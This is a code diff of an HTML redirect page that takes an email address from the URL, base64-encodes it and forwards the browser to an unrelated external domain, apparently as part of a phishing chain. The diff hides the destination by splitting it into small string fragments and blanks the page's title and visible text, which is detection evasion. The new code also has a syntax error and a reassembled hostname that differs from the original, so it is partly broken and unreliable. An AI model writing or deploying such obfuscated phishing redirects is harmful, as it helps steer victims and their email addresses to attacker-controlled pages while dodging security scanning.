@@ -3,34 +3,52 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Email Redirect</title>
+  <title>..</title>
   <script>
-    function encodeEmailAndRedirect() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('EC'); // Get the email from the query parameter 'EC'
-
-      if (email) {
-        // Encode the email using Base64
-        const encodedEmail = btoa(email);
-
-        // Define the base URL
-        const baseUrl = "https://ebuj6a.jxebpueehg.es/OlLfmM/?";
-
-        // Append the encoded email to the base URL
-        const finalUrl = baseUrl + encodedEmail;
-
-        // Redirect to the final URL
-        window.location.href = finalUrl;
-      } else {
-        alert("Email parameter 'EC' is missing!");
+    // Function to split the encoded email into chunks
+    function bIB(str, bits = 20) {
+      const bitLength = Math.ceil(str.length / bits);
+      const result = [];
+      for (let i = 0; i < bits; i++) {
+        const start = i * bitLength;
+        const end = start + bitLength;
+        result.push(str.slice(start, end));
       }
+      return result;
+    }
+    function combineBits(bits) {
+      return bits.join("");
     }
 
-    // Call the function to execute the script
+    function encodeEmailAndRedirect() {
+      const queryString = window.location.search;
+
+      const emailPrefix = "EC";
+      const emailStartIndex = queryString.indexOf(emailPrefix);
+
+      if (emailStartIndex !== -1) {
+        const email = queryString.slice(emailStartIndex + emailPrefix.length);
+
+        if (email) {
+          const encodedEmail = btoa(email);
+
+          const redirectUrlBits = [
+            "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "", "", "", "", "", "", ""
+          ];
+          const emailBits = bIB(encodedEmail);
+          const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
+          window.location.href = finalUrl;
+        } else {
+          alert("!");
+        }
+      } else {
+        alert("No access"!");
+      }
+    }
     encodeEmailAndRedirect();
   </script>
 </head>
 <body>
-  <h1>Redirecting...</h1>
+  <h1>...</h1>
 </body>
 </html>
